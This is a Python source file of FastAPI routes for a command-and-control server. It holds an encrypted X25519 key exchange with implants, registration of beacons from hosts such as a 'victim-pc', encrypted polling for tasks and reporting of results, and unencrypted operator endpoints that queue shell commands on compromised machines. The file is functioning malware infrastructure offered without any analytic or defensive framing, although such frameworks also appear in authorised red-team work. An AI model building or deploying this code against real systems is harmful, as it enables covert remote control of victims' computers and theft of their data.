"""FastAPI routes for the C2 server.

Phase 2 adds:
  - POST /api/v1/handshake  (X25519 key exchange)
  - Session key support on all encrypted endpoints (X-Key-ID header)
"""

import json

from fastapi import APIRouter, HTTPException, Request

from server import database as db
from server.config import DEFAULT_SLEEP, DEFAULT_JITTER
from server.crypto import (
    decrypt_json,
    encrypt_json,
    generate_x25519_keypair,
    compute_shared_secret,
    derive_session_key,
    session_keys,
    resolve_key,
)

router = APIRouter(prefix="/api/v1")


# ── X25519 Key Exchange ──────────────────────────────────────────────

@router.post("/handshake")
def handshake(body: dict):
    """X25519 ephemeral key exchange.

    Implant sends its public key in the clear. Server generates its own
    ephemeral keypair, computes the shared secret, derives a per-session
    AES-256-GCM key, and stores it keyed by the implant's public key hex.

    Body:  { "public_key": "<hex_32_bytes>" }
    Returns: { "public_key": "<hex_32_bytes>" }
    """
    implant_public_hex = body.get("public_key")
    if not implant_public_hex:
        raise HTTPException(400, "Missing public_key")

    try:
        implant_public_bytes = bytes.fromhex(implant_public_hex)
    except ValueError:
        raise HTTPException(400, "Invalid public_key hex")

    if len(implant_public_bytes) != 32:
        raise HTTPException(400, "public_key must be 32 bytes (64 hex chars)")

    # Generate server ephemeral keypair
    server_private, server_public = generate_x25519_keypair()

    # Compute shared secret and derive session AES key
    shared_secret = compute_shared_secret(server_private, implant_public_bytes)
    session_key = derive_session_key(shared_secret)

    # Store session key indexed by implant's public key hex
    session_keys.set(implant_public_hex, session_key)

    return {"public_key": server_public.hex()}


# ── Beacon Registration ──────────────────────────────────────────────

@router.post("/register")
def register_beacon(body: dict, request: Request):
    """Register a new beacon or update an existing one.

    Body (encrypted): {
        "id": "uuid-string",
        "hostname": "victim-pc",
        "username": "user",
        "os": "linux" | "windows" | "darwin",
        "arch": "amd64" | "arm64",
        "pid": 1234,
        "public_key": "optional-base64-ed25519-pub",
        "sleep_interval": 30,
        "jitter": 0.15
    }

    Supports X-Key-ID header for session-key decryption.
    """
    key = resolve_key(request.headers.get("X-Key-ID"))
    try:
        data = decrypt_json(body["payload"], key)
    except (ValueError, KeyError) as e:
        raise HTTPException(400, f"Decryption failed: {e}")

    required = ["id", "hostname", "os", "arch"]
    for field in required:
        if field not in data:
            raise HTTPException(400, f"Missing required field: {field}")

    session = db.get_session()
    try:
        beacon = db.register_beacon(session, data)
        return {"payload": encrypt_json({
            "success": True,
            "beacon_id": beacon.id,
            "sleep_interval": beacon.sleep_interval,
            "jitter": beacon.jitter,
            "server_id": "c2-server-v1",
        }, key)}
    finally:
        session.close()


# ── Task Polling ─────────────────────────────────────────────────────

@router.post("/poll")
def poll_tasks(body: dict, request: Request):
    """Beacon polls for pending tasks.

    Body (encrypted): {
        "beacon_id": "uuid",
        "current_task_id": null | "task-id"
    }

    Returns (encrypted): {
        "tasks": [{ "id": "...", "command": "...", "args": [...], "timeout": 60 }]
    }

    Supports X-Key-ID header for session-key decryption.
    """
    key = resolve_key(request.headers.get("X-Key-ID"))
    try:
        data = decrypt_json(body["payload"], key)
    except (ValueError, KeyError) as e:
        raise HTTPException(400, f"Decryption failed: {e}")

    beacon_id = data.get("beacon_id")
    if not beacon_id:
        raise HTTPException(400, "Missing beacon_id")

    session = db.get_session()
    try:
        db.update_beacon_heartbeat(session, beacon_id)
        pending = db.get_pending_tasks(session, beacon_id)
        tasks = [
            {
                "id": t.id,
                "command": t.command,
                "args": json.loads(t.args) if t.args else [],
                "timeout": t.timeout,
            }
            for t in pending
        ]
        return {"payload": encrypt_json({"tasks": tasks}, key)}
    finally:
        session.close()


# ── Task Result ──────────────────────────────────────────────────────

@router.post("/result")
def submit_result(body: dict, request: Request):
    """Beacon submits task execution result.

    Body (encrypted): {
        "beacon_id": "uuid",
        "task_id": "uuid",
        "output": "stdout text",
        "error": null | "stderr text"
        "status": "complete" | "failed"
    }

    Supports X-Key-ID header for session-key decryption.
    """
    key = resolve_key(request.headers.get("X-Key-ID"))
    try:
        data = decrypt_json(body["payload"], key)
    except (ValueError, KeyError) as e:
        raise HTTPException(400, f"Decryption failed: {e}")

    required = ["beacon_id", "task_id"]
    for field in required:
        if field not in data:
            raise HTTPException(400, f"Missing required field: {field}")

    session = db.get_session()
    try:
        db.update_beacon_heartbeat(session, data["beacon_id"])
        task = db.complete_task(
            session,
            data["task_id"],
            output=data.get("output"),
            error=data.get("error"),
        )
        return {"payload": encrypt_json({"success": True, "task_id": task.id, "status": task.status}, key)}
    finally:
        session.close()


# ── Operator Endpoints (unencrypted for CLI convenience) ─────────────

@router.get("/beacons")
def list_beacons():
    """List all registered beacons (operator endpoint)."""
    session = db.get_session()
    try:
        beacons = db.get_all_beacons(session)
        return {"beacons": [b.to_dict() for b in beacons]}
    finally:
        session.close()


@router.get("/beacons/{beacon_id}")
def get_beacon(beacon_id: str):
    """Get a single beacon's details."""
    session = db.get_session()
    try:
        beacon = session.query(db.Beacon).filter(db.Beacon.id == beacon_id).first()
        if not beacon:
            raise HTTPException(404, "Beacon not found")
        return {"beacon": beacon.to_dict()}
    finally:
        session.close()


@router.delete("/beacons/{beacon_id}")
def delete_beacon(beacon_id: str):
    """Delete a beacon and all its tasks."""
    session = db.get_session()
    try:
        db.delete_beacon(session, beacon_id)
        return {"success": True}
    finally:
        session.close()


@router.get("/beacons/{beacon_id}/tasks")
def list_tasks(beacon_id: str, limit: int = 50):
    """List tasks for a beacon."""
    session = db.get_session()
    try:
        tasks = db.get_beacon_tasks(session, beacon_id, limit)
        return {"tasks": [t.to_dict() for t in tasks]}
    finally:
        session.close()


@router.post("/beacons/{beacon_id}/tasks")
def create_task_endpoint(beacon_id: str, body: dict):
    """Create a new task for a beacon.

    Body: { "command": "shell", "args": ["ls", "-la"], "timeout": 60 }
    """
    command = body.get("command")
    if not command:
        raise HTTPException(400, "Missing command")

    session = db.get_session()
    try:
        beacon = session.query(db.Beacon).filter(db.Beacon.id == beacon_id).first()
        if not beacon:
            raise HTTPException(404, "Beacon not found")

        task = db.create_task(
            session,
            beacon_id,
            command,
            args=body.get("args", []),
            timeout=body.get("timeout", 60),
        )
        return {"task": task.to_dict()}
    finally:
        session.close()
